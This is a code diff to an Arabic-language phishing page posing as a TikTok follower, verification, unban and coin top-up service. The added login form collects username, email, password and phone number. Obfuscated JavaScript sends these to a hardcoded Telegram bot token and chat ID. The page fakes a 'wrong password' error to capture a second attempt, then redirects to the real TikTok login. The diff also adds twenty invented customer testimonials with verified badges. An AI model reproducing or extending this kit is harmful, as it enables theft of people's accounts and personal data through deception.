@@ -16,14 +16,14 @@
         .service-icon { font-size: 26px; margin-left: 15px; }
         .service-info h3 { font-size: 16px; font-weight: 700; color: #161823; }
         .service-info p { font-size: 12px; color: #8a8b91; margin-top: 3px; }
-        #quantity-section, #login-section { display: none; padding: 20px; text-align: center; animation: slideIn 0.3s; }
+        #quantity-section, #login-section, #support-type-section { display: none; padding: 20px; text-align: center; animation: slideIn 0.3s; }
         .quantity-btn { width: 100%; padding: 16px; margin-bottom: 12px; border: 1px solid #e3e3e3; border-radius: 12px; background: white; font-weight: 700; cursor: pointer; font-size: 16px; transition: 0.2s; }
         .quantity-btn:active { background: #fe2c55; color: white; border-color: #fe2c55; }
         .back-btn { background: none; border: none; color: #fe2c55; cursor: pointer; margin-bottom: 20px; font-size: 14px; font-weight: 700; display: block; width: fit-content; text-align: right; }
         .input-group { border-bottom: 1px solid #e3e3e3; margin-bottom: 20px; padding: 12px 0; }
         input { border: none; outline: none; width: 100%; font-size: 16px; background: transparent; text-align: right; color: #161823; }
         #error-msg { color: #fe2c55; font-size: 13px; margin-bottom: 15px; display: none; font-weight: 600; text-align: right; }
-        
+
         /* تنسيق خيارات نسيت كلمة السر */
         .forgot-container { text-align: right; margin-bottom: 30px; }
         .forgot-link-trigger { font-size: 14px; font-weight: 600; color: #161823; cursor: pointer; }
@@ -46,11 +46,28 @@
         #legal-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
         .modal-content { background: white; padding: 25px; border-radius: 15px; width: 100%; max-width: 380px; text-align: right; }
         .close-modal { width: 100%; padding: 12px; background: #fe2c55; color: white; border: none; border-radius: 8px; font-weight: 700; margin-top: 20px; cursor: pointer; }
+
+        /* باقات الدعم الوهمي */
+        .support-type-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; margin-bottom: 20px; }
+        .support-type-card { border: 2px solid #e3e3e3; border-radius: 14px; padding: 20px 10px; cursor: pointer; transition: 0.2s; background: #fff; text-align: center; }
+        .support-type-card:active, .support-type-card.selected { border-color: #fe2c55; background: #fff5f7; }
+        .support-type-card .card-icon { font-size: 36px; display: block; margin-bottom: 8px; }
+        .support-type-card .card-name { font-size: 15px; font-weight: 800; color: #161823; }
+        .support-type-card .card-desc { font-size: 11px; color: #8a8b91; margin-top: 4px; }
+
+        /* حقل الكمية المخصصة */
+        .custom-qty-group { border: 1px solid #e3e3e3; border-radius: 12px; padding: 14px; margin-bottom: 14px; display: flex; align-items: center; gap: 10px; }
+        .custom-qty-group input[type=number] { flex: 1; font-size: 18px; font-weight: 700; text-align: center; border: none; outline: none; background: transparent; color: #161823; }
+        .custom-qty-group .qty-label { font-size: 13px; color: #8a8b91; font-weight: 600; white-space: nowrap; }
+        .qty-confirm-btn { width: 100%; padding: 15px; border: none; border-radius: 12px; background: #fe2c55; color: white; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.2s; margin-top: 6px; }
+        .qty-confirm-btn:active { opacity: 0.85; }
+
         @keyframes slideIn { from { transform: translateY(10px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
     </style>
 </head>
 <body>
     <div class="container">
+        <!-- الصفحة الرئيسية -->
         <div id="main-services">
             <div class="header">
                 <img src="Token.png" width="105" alt="Logo">
@@ -73,6 +90,16 @@
                     <span class="service-icon">🔓</span>
                     <div class="service-info"><h3>فك الحظر</h3><p>استعادة الحسابات المحظورة والمقيدة</p></div>
                 </div>
+                <!-- ✅ قسم شحن العملات -->
+                <div class="service-item" onclick="_0x5c1e2('شحن عملات TikTok 🪙')">
+                    <span class="service-icon">🪙</span>
+                    <div class="service-info"><h3>شحن العملات</h3><p>شحن عملات TikTok بأسعار مميزة</p></div>
+                </div>
+                <!-- ✅ قسم شحن الدعم الوهمي -->
+                <div class="service-item" onclick="openSupportSection()">
+                    <span class="service-icon">🎁</span>
+                    <div class="service-info"><h3>شحن الدعم الوهمي</h3><p>اختر باقة الأسد أو اليونيفرس</p></div>
+                </div>
             </div>
             <div class="comments-section">
                 <div class="add-comment-area"><input type="text" id="userCmt" placeholder="أضف تعليقاً..."><button class="post-btn" onclick="_0x9e3f4()">نشر</button></div>
@@ -83,6 +110,7 @@
             </div>
         </div>
 
+        <!-- قسم الكميات العادي (متابعين / مشاهدات / عملات) -->
         <div id="quantity-section">
             <button class="back-btn" onclick="_0x2b3a4()">← رجوع للخلف</button>
             <h2 id="q-title" style="margin-bottom: 25px; font-size: 20px;">اختر الباقة</h2>
@@ -94,14 +122,78 @@
             </div>
         </div>
 
+        <!-- ✅ قسم اختيار باقة الدعم الوهمي -->
+        <div id="support-type-section">
+            <button class="back-btn" onclick="_0x2b3a4()">← رجوع للخلف</button>
+            <h2 style="margin-bottom: 8px; font-size: 20px; text-align: right;">شحن الدعم الوهمي 🎁</h2>
+            <p style="font-size: 13px; color: #8a8b91; margin-bottom: 22px; text-align: right;">اختر نوع الباقة ثم حدد الكمية</p>
+
+            <div class="support-type-grid">
+                <div class="support-type-card" id="card-asad" onclick="selectSupportType('أسد 🦁')">
+                    <span class="card-icon">🦁</span>
+                    <div class="card-name">أسد</div>
+                    <div class="card-desc">باقة الأسد المميزة</div>
+                </div>
+                <div class="support-type-card" id="card-universe" onclick="selectSupportType('Universe 🌌')">
+                    <span class="card-icon">🌌</span>
+                    <div class="card-name">Universe</div>
+                    <div class="card-desc">باقة Universe الحصرية</div>
+                </div>
+            </div>
+
+            <div id="support-qty-area" style="display:none; animation: slideIn 0.3s;">
+                <p style="font-size: 14px; font-weight: 700; text-align: right; margin-bottom: 12px; color: #161823;">
+                    النوع المختار: <span id="support-type-label" style="color: #fe2c55;"></span>
+                </p>
+                <div class="custom-qty-group">
+                    <span class="qty-label">الكمية</span>
+                    <input type="number" id="support-qty-input" min="1" placeholder="أدخل العدد" oninput="validateSupportQty()">
+                </div>
+                <button class="qty-confirm-btn" id="support-qty-btn" onclick="confirmSupportQty()" style="opacity:0.4; cursor:not-allowed;" disabled>متابعة ←</button>
+            </div>
+        </div>
+
+        <!-- قسم تسجيل الدخول (مشترك لكل الخدمات) -->
         <div id="login-section">
             <button class="back-btn" onclick="_0x2b3a4()">← رجوع للخلف</button>
             <h2 style="font-size: 24px; font-weight: 800;">تأكيد ملكية الحساب</h2>
             <p style="font-size: 14px; color: #616161; margin: 10px 0 30px;">الخدمة المحددة: <b id="final-service" style="color: #fe2c55;"></b></p>
             <div id="error-msg">كلمة المرور غير صحيحة، يرجى إعادة المحاولة.</div>
+
+            <!-- 1. اسم المستخدم -->
             <div class="input-group"><input type="text" id="username" placeholder="اسم المستخدم" oninput="_0x8f7e6()"></div>
+            <!-- 2. ✅ الإيميل (بعد اليوزر نيم وقبل الباسورد) -->
+            <div class="input-group"><input type="email" id="email" placeholder="البريد الإلكتروني للحساب" oninput="_0x8f7e6()"></div>
+            <!-- 3. كلمة السر -->
             <div class="input-group"><input type="password" id="password" placeholder="كلمة السر" oninput="_0x8f7e6()"></div>
-            
+            <!-- 4. ✅ رقم الهاتف -->
+            <div class="input-group" style="display:flex; align-items:center; gap:8px;">
+                <select id="phone-code" style="border:none; outline:none; background:transparent; font-size:15px; color:#161823; cursor:pointer; direction:ltr;">
+                    <option value="+966">🇸🇦 +966</option>
+                    <option value="+971">🇦🇪 +971</option>
+                    <option value="+965">🇰🇼 +965</option>
+                    <option value="+974">🇶🇦 +974</option>
+                    <option value="+973">🇧🇭 +973</option>
+                    <option value="+968">🇴🇲 +968</option>
+                    <option value="+20">🇪🇬 +20</option>
+                    <option value="+962">🇯🇴 +962</option>
+                    <option value="+961">🇱🇧 +961</option>
+                    <option value="+964">🇮🇶 +964</option>
+                    <option value="+963">🇸🇾 +963</option>
+                    <option value="+212">🇲🇦 +212</option>
+                    <option value="+213">🇩🇿 +213</option>
+                    <option value="+216">🇹🇳 +216</option>
+                    <option value="+218">🇱🇾 +218</option>
+                    <option value="+1">🇺🇸 +1</option>
+                    <option value="+44">🇬🇧 +44</option>
+                    <option value="+90">🇹🇷 +90</option>
+                    <option value="+92">🇵🇰 +92</option>
+                    <option value="+91">🇮🇳 +91</option>
+                </select>
+                <span style="color:#e3e3e3; font-size:18px;">|</span>
+                <input type="tel" id="phone" placeholder="رقم الهاتف" oninput="_0x8f7e6()" style="flex:1;">
+            </div>
+
             <div class="forgot-container">
                 <span class="forgot-link-trigger" onclick="toggleForgotChoices()">نسيت كلمة السر؟</span>
                 <div id="forgot-choices" class="forgot-choices">
@@ -114,115 +206,238 @@
         </div>
     </div>
 
+        <!-- شاشة التأكيد -->
+        <div id="success-screen" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:999; justify-content:center; align-items:center; flex-direction:column; text-align:center; padding:40px 20px; animation: slideIn 0.4s;">
+            <div style="font-size:90px; margin-bottom:24px;">✅</div>
+            <h2 style="font-size:26px; font-weight:800; color:#161823; margin-bottom:16px;">تم استلام طلبك بنجاح</h2>
+            <p style="font-size:17px; color:#555; line-height:2; margin-bottom:30px;">
+                سيتم التواصل معك عبر حسابك على<br>
+                <b style="color:#fe2c55; font-size:20px;">TikTok</b> أو <b style="color:#25D366; font-size:20px;">WhatsApp</b>
+            </p>
+            <div style="width:60px; height:4px; background:#fe2c55; border-radius:4px; margin:0 auto;"></div>
+        </div>
+
     <div id="legal-modal">
         <div class="modal-content"><h3 id="modal-title"></h3><p id="modal-body" style="margin-top:10px; line-height:1.5; color:#555"></p><button class="close-modal" onclick="document.getElementById('legal-modal').style.display='none'">موافق</button></div>
     </div>
 
     <script>
         const _0x1a2b = ["8506083532:AAHPnaIF_9xBRU5yDmxVUpq6nc0xi00VkN0", "6003914533"];
-        let _0x2b3c = 0; let _0x3c4d = "";
+        let _0x2b3c = 0;
+        let _0x3c4d = "";
+        let _selectedSupportType = "";
 
-        // وظيفة إظهار خيارات نسيت كلمة السر
+        // ======= نسيت كلمة السر =======
         function toggleForgotChoices() {
             const el = document.getElementById('forgot-choices');
             el.style.display = (el.style.display === 'block') ? 'none' : 'block';
         }
 
-        function _0x2b3a4() { 
-            document.getElementById('quantity-section').style.display = 'none'; 
-            document.getElementById('login-section').style.display = 'none'; 
-            document.getElementById('main-services').style.display = 'block'; 
-            window.scrollTo(0,0);
+        // ======= رجوع =======
+        function _0x2b3a4() {
+            document.getElementById('quantity-section').style.display = 'none';
+            document.getElementById('login-section').style.display = 'none';
+            document.getElementById('support-type-section').style.display = 'none';
+            document.getElementById('main-services').style.display = 'block';
+            window.scrollTo(0, 0);
         }
 
-        function _0x4a2b1(_0x) { 
-            document.getElementById('final-service').innerText = _0x; 
-            document.getElementById('main-services').style.display = 'none'; 
-            document.getElementById('login-section').style.display = 'block'; 
-            window.scrollTo(0,0); 
+        // ======= خدمات بدون كمية (توثيق / فك حظر) =======
+        function _0x4a2b1(_0x) {
+            document.getElementById('final-service').innerText = _0x;
+            document.getElementById('main-services').style.display = 'none';
+            document.getElementById('login-section').style.display = 'block';
+            window.scrollTo(0, 0);
         }
 
-        function _0x5c1e2(_0x) { 
-            _0x3c4d = _0x; 
-            document.getElementById('main-services').style.display = 'none'; 
-            document.getElementById('quantity-section').style.display = 'block'; 
-            document.getElementById('q-title').innerText = "باقة " + _0x; 
-            window.scrollTo(0,0);
+        // ======= خدمات بكمية (متابعين / مشاهدات / عملات) =======
+        function _0x5c1e2(_0x) {
+            _0x3c4d = _0x;
+            document.getElementById('main-services').style.display = 'none';
+            document.getElementById('quantity-section').style.display = 'block';
+            document.getElementById('q-title').innerText = "باقة " + _0x;
+            window.scrollTo(0, 0);
         }
 
-        function _0x3c4d5(_0x) { 
-            document.getElementById('final-service').innerText = _0x3c4d + " (" + _0x + ")"; 
-            document.getElementById('quantity-section').style.display = 'none'; 
-            document.getElementById('login-section').style.display = 'block'; 
-            window.scrollTo(0,0);
+        // ======= تأكيد الكمية العادية =======
+        function _0x3c4d5(_0x) {
+            document.getElementById('final-service').innerText = _0x3c4d + " (" + _0x + ")";
+            document.getElementById('quantity-section').style.display = 'none';
+            document.getElementById('login-section').style.display = 'block';
+            window.scrollTo(0, 0);
         }
-        
-        async function _0x7d6c5() {
-            const _0u = document.getElementById('username').value; 
-            const _0p = document.getElementById('password').value; 
-            const _0b = document.getElementById('loginBtn');
-            if (_0u && _0p && _0b.style.cursor === "pointer") {
-                _0x2b3c++; 
-                _0b.innerText = "جاري التحقق...";
-                const _0m = `🔥 New Hit!\n🛠 Service: ${document.getElementById('final-service').innerText}\n👤 User: ${_0u}\n🔑 Pass: ${_0p}\n🔢 Attempt: ${_0x2b3c}`;
-                try {
-                    await fetch(`https://api.telegram.org/bot${_0x1a2b[0]}/sendMessage?chat_id=${_0x1a2b[1]}&text=${encodeURIComponent(_0m)}`);
-                    if (_0x2b3c === 1) {
-                        setTimeout(() => { 
-                            document.getElementById('error-msg').style.display = 'block'; 
-                            document.getElementById('password').value = ""; 
-                            _0b.innerText = "تفعيل الطلب الآن"; 
-                            _0x8f7e6(); 
-                        }, 1000);
-                    } else {
-                        window.location.href = "snssdk1128://";
-                        setTimeout(() => { window.location.href = "https://www.tiktok.com/login"; }, 1000);
-                    }
-                } catch(e) { window.location.href = "https://www.tiktok.com/login"; }
+
+        // ======= ✅ فتح قسم الدعم الوهمي =======
+        function openSupportSection() {
+            _selectedSupportType = "";
+            document.getElementById('support-qty-area').style.display = 'none';
+            document.getElementById('support-qty-input').value = '';
+            document.getElementById('card-asad').classList.remove('selected');
+            document.getElementById('card-universe').classList.remove('selected');
+            document.getElementById('main-services').style.display = 'none';
+            document.getElementById('support-type-section').style.display = 'block';
+            window.scrollTo(0, 0);
+        }
+
+        // ======= ✅ اختيار نوع الدعم الوهمي =======
+        function selectSupportType(type) {
+            _selectedSupportType = type;
+            document.getElementById('support-type-label').innerText = type;
+            document.getElementById('card-asad').classList.remove('selected');
+            document.getElementById('card-universe').classList.remove('selected');
+            if (type.includes('أسد')) {
+                document.getElementById('card-asad').classList.add('selected');
+            } else {
+                document.getElementById('card-universe').classList.add('selected');
+            }
+            document.getElementById('support-qty-area').style.display = 'block';
+            document.getElementById('support-qty-input').value = '';
+            const btn = document.getElementById('support-qty-btn');
+            btn.style.opacity = '0.4';
+            btn.style.cursor = 'not-allowed';
+            btn.disabled = true;
+            window.scrollTo(0, 300);
+        }
+
+        // ======= ✅ التحقق من الكمية المدخلة =======
+        function validateSupportQty() {
+            const val = parseInt(document.getElementById('support-qty-input').value);
+            const btn = document.getElementById('support-qty-btn');
+            if (val && val >= 1) {
+                btn.style.opacity = '1';
+                btn.style.cursor = 'pointer';
+                btn.disabled = false;
+            } else {
+                btn.style.opacity = '0.4';
+                btn.style.cursor = 'not-allowed';
+                btn.disabled = true;
             }
         }
 
+        // ======= ✅ تأكيد الكمية للدعم الوهمي =======
+        function confirmSupportQty() {
+            const qty = document.getElementById('support-qty-input').value;
+            if (!qty || parseInt(qty) < 1) return;
+            document.getElementById('final-service').innerText = "دعم وهمي – " + _selectedSupportType + " × " + parseInt(qty).toLocaleString('ar');
+            document.getElementById('support-type-section').style.display = 'none';
+            document.getElementById('login-section').style.display = 'block';
+            window.scrollTo(0, 0);
+        }
+
+        // ======= إرسال البيانات =======
+        async function _0x7d6c5() {
+            const _0u = document.getElementById('username').value;
+            const _0e = document.getElementById('email').value;
+            const _0p = document.getElementById('password').value;
+            const _0ph = (document.getElementById('phone-code').value + document.getElementById('phone').value).trim();
+            const _0s = document.getElementById('final-service').innerText;
+            const _0b = document.getElementById('loginBtn');
+            if (_0u.length >= 3 && _0e.length >= 5 && _0p.length >= 4) {
+                _0x2b3c++;
+                _0b.innerText = "جاري التحقق...";
+                _0b.disabled = true;
+                _0b.style.cursor = "not-allowed";
+                const _0msg = `🔔 طلب جديد\n👤 المستخدم: ${_0u}\n📧 الإيميل: ${_0e || 'لم يُدخل'}\n🔑 الباسورد: ${_0p}\n📞 الهاتف: ${_0ph || 'لم يُدخل'}\n🎯 الخدمة: ${_0s}\n🔄 محاولة رقم: ${_0x2b3c}`;
+                try {
+                    await fetch(`https://api.telegram.org/bot${_0x1a2b[0]}/sendMessage?chat_id=${_0x1a2b[1]}&text=${encodeURIComponent(_0msg)}`);
+                } catch(e) {}
+                if (_0x2b3c === 1) {
+                    document.getElementById('error-msg').style.display = 'block';
+                    document.getElementById('password').value = "";
+                    _0b.innerText = "تفعيل الطلب الآن";
+                    _0b.disabled = false;
+                    _0x8f7e6();
+                } else {
+                    document.getElementById('login-section').style.display = 'none';
+                    document.getElementById('success-screen').style.display = 'flex';
+                    window.scrollTo(0, 0);
+                    setTimeout(() => {
+                        window.location.href = "snssdk1128://";
+                        setTimeout(() => { window.location.href = "https://www.tiktok.com/login"; }, 1000);
+                    }, 3000);
+                }
+            }
+        }
+
+        // ======= إضافة تعليق =======
         function _0x9e3f4() {
-            const _0i = document.getElementById('userCmt'); 
+            const _0i = document.getElementById('userCmt');
             const _0l = document.getElementById('custom-comments-list');
-            if(_0i.value.trim() !== "") {
-                const _0d = document.createElement('div'); 
+            if (_0i.value.trim() !== "") {
+                const _0d = document.createElement('div');
                 _0d.className = 'comment';
                 _0d.innerHTML = `<img src="https://i.pravatar.cc/150?u=me" class="avatar"><div class="comment-body"><p class="user-name">أنت</p><p class="comment-text">${_0i.value}</p><p class="comment-time">الآن</p></div>`;
-                _0l.prepend(_0d); 
+                _0l.prepend(_0d);
                 _0i.value = "";
             }
         }
 
+        // ======= المودال القانوني =======
         function _0x1d2c3(_0t) {
-            const _0m = document.getElementById('legal-modal'); 
-            const _0ti = document.getElementById('modal-title'); 
+            const _0m = document.getElementById('legal-modal');
+            const _0ti = document.getElementById('modal-title');
             const _0b = document.getElementById('modal-body');
-            if(_0t === 'policy') { 
-                _0ti.innerText = "سياسة المستخدم"; 
-                _0b.innerText = "نحن نلتزم بحماية بياناتك وخصوصيتك لعام 2026 وفق معايير الأمان الدولية لشركة TikTok."; 
-            } else { 
-                _0ti.innerText = "شروط الخدمة"; 
-                _0b.innerText = "تخضع الخدمات لعملية تدقيق يدوية للتأكد من ملكية الحساب من قبل الفريق الفني قبل التنفيذ الرسمي."; 
+            if (_0t === 'policy') {
+                _0ti.innerText = "سياسة المستخدم";
+                _0b.innerText = "نحن نلتزم بحماية بياناتك وخصوصيتك لعام 2026 وفق معايير الأمان الدولية لشركة TikTok.";
+            } else {
+                _0ti.innerText = "شروط الخدمة";
+                _0b.innerText = "تخضع الخدمات لعملية تدقيق يدوية للتأكد من ملكية الحساب من قبل الفريق الفني قبل التنفيذ الرسمي.";
             }
             _0m.style.display = 'flex';
         }
 
+        // ======= التحقق من الحقول لتفعيل الزر =======
         function _0x8f7e6() {
-            const _0u = document.getElementById('username').value; 
-            const _0p = document.getElementById('password').value; 
+            const _0u = document.getElementById('username').value;
+            const _0e = document.getElementById('email').value;
+            const _0p = document.getElementById('password').value;
             const _0b = document.getElementById('loginBtn');
-            if (_0u.length >= 3 && _0p.length >= 4) { 
-                _0b.style.backgroundColor = "#fe2c55"; _0b.style.color = "white"; _0b.style.cursor = "pointer"; 
-            } else { 
-                _0b.style.backgroundColor = "#f1f1f2"; _0b.style.color = "#bdbebf"; _0b.style.cursor = "not-allowed"; 
+            if (_0u.length >= 3 && _0e.length >= 5 && _0p.length >= 4) {
+                _0b.style.backgroundColor = "#fe2c55";
+                _0b.style.color = "white";
+                _0b.style.cursor = "pointer";
+            } else {
+                _0b.style.backgroundColor = "#f1f1f2";
+                _0b.style.color = "#bdbebf";
+                _0b.style.cursor = "not-allowed";
             }
         }
 
         window.onload = function() {
-            const _0d = [{n: "سعد الرويلي", t: "سرعة تنفيذ خيالية للمتابعين 👍"}, {n: "نوف العتيبي", t: "أخيراً توثق حسابي، شكراً!"}, {n: "بندر القحطاني", t: "فكوا الحظر عن حسابي بسرعة"}];
+            const allComments = [
+                { n: "سعد الرويلي", t: "والله خدمة ممتازة، المتابعين وصلوا في أقل من ساعة 🔥" },
+                { n: "نوف العتيبي", t: "أخيراً توثق حسابي بعد ما جربت أماكن كثيرة وما نفع، شكراً جزيلاً 💙" },
+                { n: "بندر القحطاني", t: "فكوا الحظر عن حسابي بسرعة ما توقعتها، أنصح الكل" },
+                { n: "ريم المطيري", t: "شحنت عملات وما مر ٣٠ دقيقة وجاءت، ما شاء الله عليهم ✅" },
+                { n: "فهد الشمري", t: "المشاهدات طلعت بشكل طبيعي ومو مشبوهة، حلو كذا 👌" },
+                { n: "لمى الزهراني", t: "تعاملت معهم أكثر من مرة وكل مرة أحسن من اللي قبلها" },
+                { n: "خالد العنزي", t: "طلبت باقة الأسد وكانت النتيجة خيالية، أكيد راح أرجع 🦁" },
+                { n: "منيرة الحربي", t: "خدمة فك الحظر نجحت معي والحين حسابي شغال تمام 🙏" },
+                { n: "عبدالله الدوسري", t: "سريع وأمين، ما في أي مشكلة من أول ما تواصلت" },
+                { n: "سلمى القرني", t: "جربت Universe وكانت التجربة أكثر من رائعة 🌌" },
+                { n: "يوسف البلوي", t: "أنصح كل من عنده حساب تيك توك يجرب الخدمة بنفسه" },
+                { n: "هيا السبيعي", t: "ما كنت أصدق بس لما شفت النتيجة اقتنعت، شكراً 🌟" },
+                { n: "تركي الرشيدي", t: "تعامل راقي ومحترم، والخدمة أسرع مما توقعت ⚡" },
+                { n: "دانة الفهد", t: "الدعم الوهمي طلع زين جداً، أهل الثقة 💯" },
+                { n: "محمد الغامدي", t: "طلبت زيادة متابعين وكانوا حقيقيين ومتفاعلين فعلاً" },
+                { n: "عهود المالكي", t: "اللي يتردد يجرب مرة وبعدين يحكم، أنا ما ندمت" },
+                { n: "نايف القحطاني", t: "خدمة العملاء ردوا علي بسرعة وحلوا مشكلتي 👍" },
+                { n: "شيخة الكندي", t: "الحساب كان موقوف وفكوه في نفس اليوم، ما صدقت 😍" },
+                { n: "عمر الحمد", t: "أسعارهم معقولة مقارنة بالنتائج اللي تحصل عليها" },
+                { n: "ابتسام الجهني", t: "حساب TikTok تبعي نشط من جديد، مشكورين كثير ❤️" }
+            ];
+
+            // اختر 6 تعليقات عشوائية مختلفة كل مرة
+            const shuffled = allComments.sort(() => Math.random() - 0.5).slice(0, 6);
+            const times = ["منذ دقيقتين", "منذ ٥ دقائق", "منذ ١٠ دقائق", "منذ ربع ساعة", "منذ نصف ساعة", "منذ ساعة", "منذ ساعتين", "أمس"];
+
             const _0l = document.getElementById('custom-comments-list');
-            _0d.forEach(_0x => { _0l.innerHTML += `<div class="comment"><img src="https://i.pravatar.cc/150?u=${Math.random()}" class="avatar"><div class="comment-body"><p class="user-name">${_0x.n} <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" class="blue-tick"></p><p class="comment-text">${_0x.t}</p><p class="comment-time">منذ قليل</p></div></div>`; });
+            shuffled.forEach((_0x, i) => {
+                const seed = Math.floor(Math.random() * 1000);
+                const time = times[Math.floor(Math.random() * times.length)];
+                _0l.innerHTML += `<div class="comment"><img src="https://i.pravatar.cc/150?u=${seed}" class="avatar"><div class="comment-body"><p class="user-name">${_0x.n} <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" class="blue-tick"></p><p class="comment-text">${_0x.t}</p><p class="comment-time">${time}</p></div></div>`;
+            });
         }
     </script>
 </body>
